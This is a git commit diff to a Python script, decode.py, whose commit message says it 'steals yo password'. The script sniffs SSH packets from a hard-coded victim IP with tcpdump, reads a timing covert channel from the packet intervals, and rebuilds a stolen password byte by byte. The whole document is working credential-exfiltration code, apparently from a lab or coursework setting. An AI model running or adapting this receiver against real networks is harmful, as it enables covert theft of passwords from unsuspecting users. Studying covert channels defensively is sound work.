ce05642a00a00cecfdf22dfc3d0f95005e039401
Ian Sweet <iannsweet@gmail.com>
2017-04-13 21:39:44 -0400

    janky, but steals yo password

--- decode.py
+++ decode.py
@@ -10,7 +10,11 @@ on  = window / 2
 victim = "10.104.113.15"
 gateway = "10.104.113.14"
 
-filt = "port 22 and src " + victim + " and dst " + gateway + " and tcp[13] & 8 != 0"
+filt = "port 22 and src " + victim + " and dst " + gateway + " and tcp[13] & 8 != 0 and greater 102 and less 104"
+
+i = 0
+curr_byte = 0
+pw = ""
 
 p = sub.Popen(('sudo', 'tcpdump', '-l', '-ttt', filt), stdout=sub.PIPE)
 for l in iter(p.stdout.readline, b''):
@@ -21,5 +25,22 @@ for l in iter(p.stdout.readline, b''):
     code = millis % window
     if on - epsilon < code and code < on + epsilon:
         print 1,
+        curr_byte |= (0x01 << (7 - (i % 8)))
     else:
         print 0,
+
+    i += 1
+
+
+    if (i % 8 == 0):
+        print ""
+        pw += chr(curr_byte)
+        if (chr(curr_byte) == '\0'):
+            break;
+        curr_byte = 0
+
+print pw
+
+
+
+        
